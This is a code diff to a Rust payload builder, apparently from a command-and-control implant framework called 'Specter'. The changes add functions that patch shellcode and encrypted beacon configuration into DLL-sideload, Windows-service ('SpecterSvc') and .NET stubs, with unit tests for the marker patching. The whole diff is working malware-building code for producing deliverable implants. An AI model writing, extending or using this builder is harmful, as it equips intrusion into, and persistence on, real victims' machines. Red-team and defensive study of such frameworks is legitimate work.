@@ -228,18 +228,41 @@ impl PayloadBuilder {
 
         let build_id = uuid::Uuid::new_v4().to_string();
 
-        // For raw shellcode, we can produce output even without a template
-        // by concatenating PIC blob + config
+        // For raw shellcode, concatenate PIC blob + config.
+        // For PE formats, try pre-compiled template first, fall back to
+        // generated minimal PE stubs if no template is available.
         let payload = if format == OutputFormat::RawShellcode {
             self.format_raw(&gen)?
+        } else if let Some(template) = self.templates.get(&format) {
+            // Pre-compiled PE stub: patch config, then embed PIC blob
+            let mut patched = self.embed_config(template, &gen)?;
+
+            // Embed the PIC blob into the stub at the SPECPICBLOB marker
+            if let Some(pic_template) = self.templates.get(&OutputFormat::RawShellcode) {
+                patched = Self::embed_pic_blob(patched, &pic_template.data)?;
+            }
+
+            patched
         } else {
-            let template = self.templates.get(&format).ok_or_else(|| {
-                BuilderError::TemplateNotFound(format!(
-                    "no template for format '{}'",
-                    format.as_str()
-                ))
-            })?;
-            self.embed_config(template, &gen)?
+            // No pre-compiled template — use generated PE stubs.
+            // Get the raw PIC blob (if available) for embedding.
+            let pic_blob = self
+                .templates
+                .get(&OutputFormat::RawShellcode)
+                .map(|t| t.data.as_slice())
+                .unwrap_or(&[]);
+            match format {
+                OutputFormat::DllSideload => {
+                    formats::format_dll(pic_blob, &gen.config_blob, None)
+                }
+                OutputFormat::ServiceExe => {
+                    formats::format_service_exe(pic_blob, &gen.config_blob, "SpecterSvc")
+                }
+                OutputFormat::DotNetAssembly => {
+                    formats::format_dotnet(pic_blob, &gen.config_blob)
+                }
+                OutputFormat::RawShellcode => unreachable!(),
+            }
         };
 
         Ok(BuildResult {
@@ -331,6 +354,65 @@ impl PayloadBuilder {
             let config_len = gen.config_blob.len() as u32;
             payload.extend_from_slice(&config_len.to_le_bytes());
             payload.extend_from_slice(&gen.config_blob);
+        }
+
+        Ok(payload)
+    }
+
+    /// Embed a PIC blob into a PE template by locating the PIC placeholder marker
+    /// and patching it with the actual PIC blob data.
+    ///
+    /// Marker: `SPECPICBLOB\x00` (12 bytes) followed by 4-byte LE size field.
+    /// The builder writes the PIC blob size into the size field and copies
+    /// the PIC blob data into the space following it.
+    ///
+    /// The stubs allocate a large `.data` region after the marker
+    /// (PIC_MAX_CAPACITY = 256KB) which the builder fills with PIC data.
+    fn embed_pic_blob(mut payload: Vec<u8>, pic_blob: &[u8]) -> Result<Vec<u8>, BuilderError> {
+        const PIC_MARKER: &[u8; 12] = b"SPECPICBLOB\x00";
+        const PIC_MAX_CAPACITY: usize = 256 * 1024;
+
+        if pic_blob.is_empty() {
+            return Ok(payload);
+        }
+
+        if let Some(marker_pos) = find_marker(&payload, PIC_MARKER) {
+            let size_offset = marker_pos + PIC_MARKER.len();
+
+            // Verify there is room for the size field
+            if size_offset + 4 > payload.len() {
+                return Err(BuilderError::Config(
+                    "PIC blob marker found but size field truncated".into(),
+                ));
+            }
+
+            // Check that the PIC blob fits within the allocated capacity
+            let data_offset = size_offset + 4;
+            let available = payload.len().saturating_sub(data_offset);
+            if pic_blob.len() > available || pic_blob.len() > PIC_MAX_CAPACITY {
+                return Err(BuilderError::Config(format!(
+                    "PIC blob ({} bytes) exceeds stub capacity ({} bytes available, {} max)",
+                    pic_blob.len(),
+                    available,
+                    PIC_MAX_CAPACITY,
+                )));
+            }
+
+            // Write PIC blob size (u32 LE) at the size field
+            let size_bytes = (pic_blob.len() as u32).to_le_bytes();
+            payload[size_offset..size_offset + 4].copy_from_slice(&size_bytes);
+
+            // Copy PIC blob data into the region after the size field
+            payload[data_offset..data_offset + pic_blob.len()]
+                .copy_from_slice(pic_blob);
+        } else {
+            // No marker found in template -- this is an older-style stub
+            // that does not support PIC embedding. Log a warning but
+            // do not fail; the builder may have other embedding strategies.
+            tracing::warn!(
+                "PIC blob marker (SPECPICBLOB) not found in template; \
+                 PIC blob will not be embedded"
+            );
         }
 
         Ok(payload)
@@ -558,6 +640,111 @@ transform:
         let data = b"\x00\x00\x00CCCCCCCCCCCCCCCC\x80\x00\x00\x00";
         let pos = find_marker(data, b"CCCCCCCCCCCCCCCC");
         assert_eq!(pos, Some(3));
+    }
+
+    #[test]
+    fn test_embed_pic_blob_with_marker() {
+        // Create a payload with a PIC marker + size field + space
+        let mut template = vec![0x00u8; 4096];
+        // Place PIC marker at offset 100
+        template[100..112].copy_from_slice(b"SPECPICBLOB\x00");
+        // Size field (4 bytes, initially 0)
+        template[112..116].copy_from_slice(&0u32.to_le_bytes());
+        // Remaining bytes are space for PIC data
+
+        let pic_blob = vec![0xCC; 256];
+        let result = PayloadBuilder::embed_pic_blob(template.clone(), &pic_blob).unwrap();
+
+        // Size field should now contain 256
+        let embedded_size = u32::from_le_bytes([
+            result[112], result[113], result[114], result[115],
+        ]);
+        assert_eq!(embedded_size, 256);
+
+        // PIC data should be at offset 116
+        assert_eq!(&result[116..116 + 256], &pic_blob[..]);
+
+        // Overall size unchanged (in-place patching)
+        assert_eq!(result.len(), 4096);
+    }
+
+    #[test]
+    fn test_embed_pic_blob_empty_blob() {
+        let template = vec![0x00u8; 512];
+        let result = PayloadBuilder::embed_pic_blob(template.clone(), &[]).unwrap();
+        // No changes when blob is empty
+        assert_eq!(result, template);
+    }
+
+    #[test]
+    fn test_embed_pic_blob_no_marker() {
+        // Template without PIC marker -- should succeed with warning
+        let template = vec![0x00u8; 512];
+        let pic_blob = vec![0xCC; 64];
+        let result = PayloadBuilder::embed_pic_blob(template.clone(), &pic_blob).unwrap();
+        // Payload unchanged (no marker to patch)
+        assert_eq!(result, template);
+    }
+
+    #[test]
+    fn test_builder_dll_with_config_and_pic() {
+        let dir = TempDir::new().unwrap();
+
+        // Create a raw PIC template (specter.bin)
+        let pic_data = vec![0x90; 128]; // NOP sled as fake PIC blob
+        std::fs::write(dir.path().join("specter.bin"), &pic_data).unwrap();
+
+        // Create a DLL stub with both config marker and PIC marker
+        let mut stub = vec![0x00u8; 8192];
+
+        // Config marker at offset 64
+        stub[64..80].copy_from_slice(b"CCCCCCCCCCCCCCCC");
+        stub[80..84].copy_from_slice(&1024u32.to_le_bytes());
+
+        // PIC marker at offset 2048
+        stub[2048..2060].copy_from_slice(b"SPECPICBLOB\x00");
+        stub[2060..2064].copy_from_slice(&0u32.to_le_bytes());
+
+        std::fs::write(dir.path().join("sideload_stub.dll"), &stub).unwrap();
+
+        let config = BuilderConfig {
+            template_dir: dir.path().to_path_buf(),
+        };
+        let builder = builder_init(&config).unwrap();
+        assert!(builder.has_format(OutputFormat::DllSideload));
+        assert!(builder.has_format(OutputFormat::RawShellcode));
+
+        let secret = x25519_dalek::StaticSecret::random_from_rng(rand::thread_rng());
+        let pubkey = PublicKey::from(&secret);
+
+        let result = builder
+            .build(
+                OutputFormat::DllSideload,
+                &test_profile(),
+                &pubkey,
+                &test_channels(),
+                &SleepConfig::default(),
+                None,
+            )
+            .unwrap();
+
+        // Config marker should be patched
+        assert_ne!(&result.payload[64..80], b"CCCCCCCCCCCCCCCC");
+
+        // PIC blob size should be written at offset 2060
+        let pic_size = u32::from_le_bytes([
+            result.payload[2060],
+            result.payload[2061],
+            result.payload[2062],
+            result.payload[2063],
+        ]);
+        assert_eq!(pic_size, 128);
+
+        // PIC blob data should be at offset 2064
+        assert_eq!(&result.payload[2064..2064 + 128], &pic_data[..]);
+
+        // Payload size unchanged
+        assert_eq!(result.payload.len(), stub.len());
     }
 
     #[test]
